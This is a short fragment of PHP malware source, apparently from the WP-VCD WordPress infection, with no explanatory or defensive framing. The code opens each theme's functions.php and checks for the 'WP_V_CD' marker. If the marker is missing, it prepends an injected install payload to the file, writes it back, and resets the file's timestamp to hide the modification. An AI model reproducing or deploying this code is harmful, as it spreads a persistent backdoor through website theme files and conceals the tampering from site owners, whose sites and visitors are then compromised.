<?php
  if($content = @file_get_contents($themes . DIRECTORY_SEPARATOR . $_ . DIRECTORY_SEPARATOR . 'functions.php'))
    {
      if(strpos($content, 'WP_V_CD') === false)    
        {
          $content = $install_code . $content;
          @file_put_contents($themes . DIRECTORY_SEPARATOR . $_ . DIRECTORY_SEPARATOR . 'functions.php', $content);
          touch($themes . DIRECTORY_SEPARATOR . $_ . DIRECTORY_SEPARATOR . 'functions.php' , $time);
        }
      else
        {
          $ping = false;
        }
    }
?>